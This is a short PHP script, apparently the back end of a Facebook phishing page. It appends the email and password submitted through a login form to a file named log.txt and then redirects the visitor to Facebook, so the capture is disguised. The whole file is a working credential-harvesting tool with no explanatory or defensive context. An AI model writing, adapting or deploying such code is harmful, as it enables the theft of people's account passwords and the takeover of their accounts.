<?php

file_put_contents("log.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: www.facebook.com');
exit();
?>